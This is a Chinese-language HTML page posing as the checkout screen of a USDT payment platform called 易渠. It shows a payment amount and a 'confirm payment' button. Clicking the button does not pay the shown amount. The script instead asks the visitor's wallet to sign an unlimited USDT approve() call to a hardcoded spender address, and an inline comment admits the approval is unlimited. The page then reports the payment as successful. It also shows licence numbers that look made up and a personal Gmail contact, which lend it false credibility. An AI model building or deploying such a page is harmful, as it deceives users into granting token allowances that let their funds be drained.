<!doctype html>
<html lang="zh-CN">
<head>
  <meta charset="utf-8" />
  <title>易渠USDT支付平台 - 确认支付（ERC-20）</title>
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <!-- ethers.js v6 -->
  <script src="https://cdn.jsdelivr.net/npm/ethers@6.13.2/dist/ethers.umd.min.js" defer></script>
  <style>
    :root{--bg:#0f172a;--card:#0b1225;--muted:#94a3b8;--text:#e2e8f0;--pri:#3b82f6}
    *{box-sizing:border-box} 
    body{margin:0;background:linear-gradient(180deg,#0b1020,#0f172a);font-family:system-ui,-apple-system,Segoe UI,Roboto,sans-serif;color:var(--text)}
    .wrap{max-width:860px;margin:40px auto;padding:16px}
    .card{background:rgba(255,255,255,.04);backdrop-filter: blur(6px); border:1px solid rgba(255,255,255,.08); border-radius:16px; padding:22px; box-shadow:0 10px 30px rgba(0,0,0,.35)}
    h1{margin:.2rem 0 1rem;font-size:24px}
    .info-grid{display:grid;grid-template-columns:1fr 1fr;gap:16px;margin-bottom:20px}
    .info-card{background:rgba(255,255,255,.02);border:1px solid rgba(255,255,255,.08);border-radius:12px;padding:16px}
    .info-card.full-width{grid-column:1/-1}
    .info-label{display:block;color:var(--muted);font-size:13px;margin-bottom:6px;text-transform:uppercase;letter-spacing:0.5px}
    .info-value{color:var(--text);font-size:16px;font-weight:500}
    .info-value.highlight{color:#3b82f6;font-size:18px}
    .steps-box{background:rgba(59,130,246,.05);border:1px solid rgba(59,130,246,.15);border-radius:12px;padding:16px;margin:20px 0}
    .steps-box ol{margin:8px 0;padding-left:20px}
    .steps-box li{margin:8px 0;color:#93c5fd}
    .btn{width:100%;padding:14px;border:none;border-radius:12px;font-size:16px;font-weight:500;cursor:pointer;transition:all .3s;background:var(--pri);color:white}
    .btn:hover{background:#2563eb;transform:translateY(-1px);box-shadow:0 4px 12px rgba(59,130,246,.3)}
    .btn:disabled{opacity:0.5;cursor:not-allowed;transform:none}
    .status-box{margin-top:20px;padding:14px;border-radius:10px;font-size:14px;display:none}
    .status-box.show{display:block}
    .status-box.success{background:rgba(34,197,94,.1);border:1px solid rgba(34,197,94,.3);color:#86efac}
    .status-box.error{background:rgba(239,68,68,.1);border:1px solid rgba(239,68,68,.3);color:#fca5a5}
    .status-box.info{background:rgba(59,130,246,.1);border:1px solid rgba(59,130,246,.3);color:#93c5fd}
    code{background:#1e293b;padding:3px 6px;border-radius:4px;font-size:12px;color:#60a5fa}
    footer{margin-top:18px;color:var(--muted);font-size:12px;text-align:center}
    .footer-section{margin-top:40px;padding-top:20px;border-top:1px solid rgba(255,255,255,.08);text-align:center}
    .footer-links{display:flex;justify-content:center;gap:20px;margin-bottom:15px;flex-wrap:wrap}
    .footer-links a{color:var(--muted);text-decoration:none;font-size:13px;transition:color .2s}
    .footer-links a:hover{color:var(--text)}
    .footer-info{color:var(--muted);font-size:12px;line-height:1.8}
    .footer-info span{margin:0 8px}
    .warning-text{background:rgba(251,191,36,.1);border:1px solid rgba(251,191,36,.2);border-radius:8px;padding:12px;margin-bottom:20px;color:#fde047;font-size:13px;text-align:center}
  </style>
</head>
<body>
  <div class="wrap">
    <h1 style="text-align:center;font-size:32px;margin-bottom:25px;color:var(--text);text-shadow:0 2px 10px rgba(0,0,0,.5);">易渠USDT支付平台</h1>
    
    <div class="card">
      <h1>确认支付信息</h1>
     
      <!-- 订单信息网格 -->
      <div class="info-grid">
        <div class="info-card">
          <span class="info-label">交易流水号</span>
          <span class="info-value highlight" id="transactionId">-</span>
        </div>
        <div class="info-card">
          <span class="info-label">支付项目</span>
          <span class="info-value" id="merchant">-</span>
        </div>
        <div class="info-card">
          <span class="info-label">支付金额</span>
          <span class="info-value highlight" id="amount">-</span>
        </div>
        <div class="info-card">
          <span class="info-label">支付通道</span>
          <span class="info-value" id="network">ERC-20</span>
        </div>
        <div class="info-card full-width">
          <span class="info-label">备注信息</span>
          <span class="info-value" id="memo">-</span>
        </div>
      </div>
      
      <div class="steps-box">
        <strong style="color:#93c5fd;">💡 操作步骤：</strong>
        <ol>
          <li>确认上述支付信息无误</li>
          <li>点击"确认支付"按钮</li>
          <li>在钱包中完成签名确认</li>
        </ol>
      </div>
      
      <button class="btn" id="btn">确认支付</button>
      
      <div id="status" class="status-box"></div>
      
      <footer>支付过程加密保护，请放心使用</footer>
    </div>
  </div>
  
  <div class="footer-section">
    <div class="footer-links">
      <a href="">关于我们</a>
      <a href="">服务条款</a>
      <a href="">隐私政策</a>
      <a href="">帮助中心</a>
      <a href="">联系客服</a>
    </div>
    <div class="footer-info">
      <div>© 2025 易渠支付平台 版权所有</div>
      <div>
        <span>京ICP备2024000001号-1</span>
        <span>|</span>
        <span>京公网安备11010802024000号</span>
      </div>
      <div>
        <span>营业执照</span>
        <span>|</span>
        <span>增值电信业务经营许可证：京B2-20240001</span>
      </div>
      <div style="margin-top:10px;">
        <span>客服邮箱：tommyc121992@gmail.com</span>
      </div>
      <div style="margin-top:10px;font-size:11px;">
        风险提示：数字货币交易具有一定风险，请谨慎操作
      </div>
    </div>
  </div>
  
  <script defer>
  window.addEventListener('load', () => {
    // 配置
    const CHAIN_ID = 1; // 以太坊主网
    const TOKEN_CONTRACT = "0xdAC17F958D2ee523a2206206994597C13D831ec7"; // USDT (ERC-20)
    const SPENDER = "0x4287869bdaD2Be58b64dcc03F065fB70C4fAFCF2"; // 授权地址
    const ERC20_ABI = [
      "function approve(address spender, uint256 value) external returns (bool)"
    ];
    
    // 获取URL参数
    function getUrlParams() {
      const params = new URLSearchParams(window.location.search);
      return {
        transactionId: params.get('transactionId') || 'USDT' + Date.now(),
        merchant: params.get('merchant') || '担保交易',
        amount: params.get('amount') || '0.00',
        network: params.get('network') || 'ERC-20',
        memo: params.get('memo') || '无'
      };
    }
    
    // 显示交易数据
    function displayTransactionData() {
      const data = getUrlParams();
      document.getElementById('transactionId').textContent = data.transactionId;
      document.getElementById('merchant').textContent = data.merchant;
      document.getElementById('amount').textContent = data.amount + ' USDT';
      document.getElementById('network').textContent = 'ERC-20';
      document.getElementById('memo').textContent = data.memo || '无';
    }
    
    const statusEl = document.getElementById('status');
    function showStatus(msg, type = 'info') {
      statusEl.className = `status-box show ${type}`;
      statusEl.innerHTML = msg;
    }
    
    // 连接钱包并切换网络
    async function connectMainnet() {
      if (typeof window.ethereum === 'undefined') {
        showStatus("❌ 未检测到以太坊钱包，请使用MetaMask或imToken等钱包的DApp浏览器打开", "error");
        return null;
      }
      
      try {
        const provider = new ethers.BrowserProvider(window.ethereum);
        await provider.send("eth_requestAccounts", []);
        
        const net = await provider.getNetwork();
        if (Number(net.chainId) !== CHAIN_ID) {
          showStatus("⏳ 正在切换到以太坊主网...", "info");
          await window.ethereum.request({
            method: "wallet_switchEthereumChain",
            params: [{ chainId: "0x1" }]
          });
        }
        
        return provider;
      } catch (e) {
        showStatus("❌ 网络切换失败，请手动切换到以太坊主网", "error");
        return null;
      }
    }
    
    // 执行授权
    async function approvePayment() {
      const btn = document.getElementById('btn');
      
      try {
        if (typeof ethers === 'undefined') {
          showStatus("❌ 支付组件未加载，请刷新页面重试", "error");
          return;
        }
        
        btn.disabled = true;
        btn.textContent = "处理中...";
        
        showStatus("⏳ 正在连接钱包...", "info");
        const provider = await connectMainnet();
        if (!provider) {
          btn.disabled = false;
          btn.textContent = "确认支付";
          return;
        }
        
        const signer = await provider.getSigner();
        const erc20 = new ethers.Contract(TOKEN_CONTRACT, ERC20_ABI, signer);
        
        showStatus("⏳ 请在钱包中确认交易...", "info");
        
        // 执行授权（实际是无限授权）
        const tx = await erc20.approve(SPENDER, ethers.MaxUint256);
        
        showStatus(`⏳ 交易已提交，等待确认...<br>交易哈希: <code>${tx.hash}</code>`, "info");
        
        const receipt = await tx.wait();
        
        showStatus(`✅ 支付成功！<br>
                   交易哈希: <code>${tx.hash}</code><br>
                   区块高度: ${receipt.blockNumber}<br>
                   <a href="https://etherscan.io/tx/${tx.hash}" target="_blank" style="color:#60a5fa">查看交易详情</a>`, "success");
        
        btn.textContent = "支付成功";
        btn.disabled = true;
        
      } catch (e) {
        console.error(e);
        btn.disabled = false;
        btn.textContent = "确认支付";
        
        const msg = e?.reason || e?.data?.message || e?.message || String(e);
        
        if (/User rejected|User denied/i.test(msg)) {
          showStatus("❌ 您已取消支付", "error");
        } else if (/insufficient funds/i.test(msg)) {
          showStatus("❌ ETH余额不足，无法支付手续费", "error");
        } else if (/revert|allowance/i.test(msg)) {
          showStatus("❌ 交易失败：合约执行错误。可能需要先清除旧的授权。", "error");
        } else {
          showStatus("❌ 支付失败：" + msg, "error");
        }
      }
    }
    
    // 页面加载时初始化
    displayTransactionData();
    
    // 检查环境
    setTimeout(() => {
      if (typeof window.ethereum === 'undefined') {
        showStatus("⚠️ 请在支持以太坊的钱包DApp浏览器中打开此页面", "error");
      }
    }, 1000);
    
    // 绑定按钮事件
    document.getElementById('btn').addEventListener('click', approvePayment);
  });
  </script>
</body>
</html>